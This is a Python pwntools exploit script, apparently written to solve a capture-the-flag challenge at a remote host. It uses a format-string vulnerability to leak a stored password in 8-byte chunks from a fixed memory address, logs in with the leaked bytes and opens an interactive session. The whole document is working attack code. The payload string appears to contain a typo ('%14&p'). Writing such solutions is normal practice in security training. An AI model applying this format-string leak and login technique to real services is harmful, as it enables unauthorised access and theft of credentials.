from pwn import * 
from LibcSearcher import * 
context.log_level = 'debug' 
# p=process('./run')
passwds=b''
for i in range(7):
    try:
        p=remote('t.ctf.qwq.cc',49284)
        print(i,"try")
        pause()
        s_addr=0x00000000004040C0
        elf=ELF('./run')
        p.recvuntil(b'Please login:\nUsername:')
        payload=p64(s_addr+8*i)+b'%14&p'
        # 第十四个为开头

        p.sendline(payload)
        # print(p.recvuntil(b'Password:'))

        p.recvuntil(b'Hello, ')
        print(p.recv())
        pause()
        passwd=p.recvuntil(b'\n').strip()
        print(passwd)
        passwds+=passwd.ljust(8,b'\x00')
    except:
        pass
print(passwds,hex(len(passwds)))
p=remote('t.ctf.qwq.cc',49284)
print('realhack')
pause()
p.recvuntil(b'Please login:\nUsername:')
payload=b'aa'
p.sendline(payload)
print(p.recvuntil(b'Password:'))
p.send(passwds)
p.interactive()